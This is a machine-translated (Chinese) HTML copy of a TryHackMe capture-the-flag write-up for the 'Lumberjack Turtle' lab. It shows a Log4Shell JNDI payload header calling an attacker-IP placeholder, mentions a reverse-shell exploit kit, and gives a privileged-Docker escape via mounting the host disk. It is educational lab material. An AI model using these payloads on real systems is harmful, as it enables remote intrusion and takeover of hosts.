<html>
<head>
<title>Lumberjack Turtle — Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">伐木工人海龟——报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/lumberjack-turtle-writeup-29b647e9b694?source=collection_archive---------0-----------------------#2022-02-01">https://infosecwriteups.com/lumberjack-turtle-writeup-29b647e9b694?source=collection_archive---------0-----------------------#2022-02-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2967" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">难度</strong>:中等房间<br/> <strong class="jp ir">描述</strong>:没有原木，就没有犯罪……伐木工人这么说。</p><p id="8a5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿，伙计们，这是TryHackme网站关于伐木工海龟房间的报道。</p><h1 id="20f0" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">列举</h1><h1 id="b8cb" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Nmap</h1><figure class="lk ll lm ln gt lo"><div class="bz fp l di"><div class="lp lq l"/></div></figure><h2 id="e688" class="lr kn iq bd ko ls lt dn ks lu lv dp kw jy lw lx la kc ly lz le kg ma mb li mc bi translated">网站(端口80)</h2><p id="79cc" class="pw-post-body-paragraph jn jo iq jp b jq md js jt ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk ij bi translated">访问任何随机不存在的页面(<code class="fe mi mj mk ml b">/test</code>)都会抛出404状态码这个错误。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mm"><img src="../Images/3f545b0f40ae95664192280de89d8130.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2kf5h1giWg0uzcOT.png"/></div></div></figure><p id="4f25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问<code class="fe mi mj mk ml b">/error</code>给错误信息中的<code class="fe mi mj mk ml b">status=999</code>500状态码。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mt"><img src="../Images/e54b00318ce632efccd29213419f2ff1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7irQeOMKdZ2XhQ0i.png"/></div></div></figure><p id="7176" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行递归目录破坏，我们有<code class="fe mi mj mk ml b">/~logs/log4j</code>目录。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mm"><img src="../Images/aa937bf07fc0b25d5c4b1f108704a8a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*orq-nRqTKAmK1OiV.png"/></div></div></figure><p id="8f0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应头<code class="fe mi mj mk ml b">X-THM-HINT: CVE-2021-44228 against X-Api-Version</code>提示我们必须使用<code class="fe mi mj mk ml b">X-Api-Version</code>头。</p><p id="c0c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，CVE-2021–44228是影响Apache的Java日志库Log4j的Log4Shell漏洞，使得攻击者能够在受影响的系统上远程运行命令。它得到了10.0的CVSS评分，这是可能的最高分。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mu"><img src="../Images/299fc2a201fb68ac012176caa9729a65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8jfTAT2EWRBSqQVl.png"/></div></div></figure><h1 id="d97b" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">剥削</h1><p id="6904" class="pw-post-body-paragraph jn jo iq jp b jq md js jt ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk ij bi translated">尝试向服务器发送一个带有<code class="fe mi mj mk ml b">X-Api-Version: ${jndi:ldap://ATTACKER-IP:3333}</code>的请求。另外，在端口3333上运行一个netcat监听器。netcat监听器将监听来自受害机器的连接:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/b3c306a3e89bbf299a3b353fa513c919.png" data-original-src="https://miro.medium.com/v2/resize:fit:942/format:webp/0*X7x4WSI4RNXCh-fn.png"/></div></figure><p id="40c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这样，我们可以确认web应用程序确实容易受到攻击。</p><p id="5733" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，<code class="fe mi mj mk ml b">git clone</code>github的<a class="ae kl" href="https://github.com/pimps/JNDI-Exploit-Kit" rel="noopener ugc nofollow" target="_blank"> JNDI漏洞工具包</a>。遵循github repo中README.md文件上的说明。现在，将目录更改为JNDI漏洞利用工具包目录，并运行漏洞利用:</p><figure class="lk ll lm ln gt lo"><div class="bz fp l di"><div class="lp lq l"/></div></figure><p id="8099" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">base64有效负载是一个简单的反向shell，它在端口9999连接回我们的攻击者机器。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mw"><img src="../Images/4ba9f5db63e300765f55cc10cc7b1053.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MNMKlKwhilXms6jN.png"/></div></div></figure><p id="432f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从上面显示的输出中获取漏洞URL并发送请求。</p><figure class="lk ll lm ln gt lo"><div class="bz fp l di"><div class="lp lq l"/></div></figure><p id="27a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确保在端口9999上运行一个监听器。</p><h1 id="fecf" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">权限提升</h1><p id="e8f7" class="pw-post-body-paragraph jn jo iq jp b jq md js jt ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk ij bi translated">我们得到一个壳作为根。但它实际上是在docker容器中。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mx"><img src="../Images/2cbf1e17fed3b2d797c7b2d0b62e3331.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Ecb_pXegm37Y48Js.png"/></div></div></figure><p id="dfce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">flag1位于<code class="fe mi mj mk ml b">/opt/.flag1</code>运行linpeas，我们可以看到特权模式被启用。它允许我们从docker容器中访问主机文件系统。我们只需安装磁盘。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi my"><img src="../Images/a9207a4cecc2bf6c1281aa2555a99f00.png" data-original-src="https://miro.medium.com/v2/resize:fit:502/format:webp/0*QxXos0XGToumH44A.png"/></div></figure><p id="e78c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用<code class="fe mi mj mk ml b">fdisk -l</code>检查系统中的磁盘</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/74d84758381a5c6f92cd9865c872d14e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/0*WfbT0-WlKoGlRvk0.png"/></div></figure><p id="6813" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">主机在<code class="fe mi mj mk ml b">/dev/xvda1</code>使用磁盘。在<code class="fe mi mj mk ml b">/mnt/host</code>处创建一个文件夹并安装驱动器:</p><pre class="lk ll lm ln gt na ml nb nc aw nd bi"><span id="51e9" class="lr kn iq ml b gy ne nf l ng nh">mount /dev/xvda1 /mnt/host</span></pre><p id="0975" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可以从<code class="fe mi mj mk ml b">/mnt/host</code>访问主机文件系统。使用<code class="fe mi mj mk ml b">chroot /mnt/host</code>改变根文件系统。创建一个SSH密钥对，并使用<code class="fe mi mj mk ml b">id_rsa</code>文件获得一个SSH会话:</p><figure class="lk ll lm ln gt lo"><div class="bz fp l di"><div class="lp lq l"/></div></figure><p id="e987" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">登录，你会看到一个目录<code class="fe mi mj mk ml b">/root/...</code>。根标志在此文件夹中。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/d703745bb658ead7aaffed0b22a8b2e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:944/format:webp/0*Ou3WRdtYd5fVF0EI.png"/></div></figure><p id="4d65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">黑客快乐！</p></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><p id="ddcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nq">原载于【https://github.com】<a class="ae kl" href="https://github.com/xplo1t-sec/CTF/blob/master/TryHackMe/LumberjackTurtle/README.md" rel="noopener ugc nofollow" target="_blank"><em class="nq"/></a><em class="nq">。</em></em></p></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><h1 id="8072" class="km kn iq bd ko kp nr kr ks kt ns kv kw kx nt kz la lb nu ld le lf nv lh li lj bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae kl" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="nw nx gp gr ny nz"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="oa ab fo"><div class="ob ab oc cl cj od"><h2 class="bd ir gy z fp oe fr fs of fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="og l"><h3 class="bd b gy z fp oe fr fs of fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oh l"><p class="bd b dl z fp oe fr fs of fu fw dk translated">iwcon.live</p></div></div><div class="oi l"><div class="oj l ok ol om oi on mr nz"/></div></div></a></div></div></div>    
</body>
</html>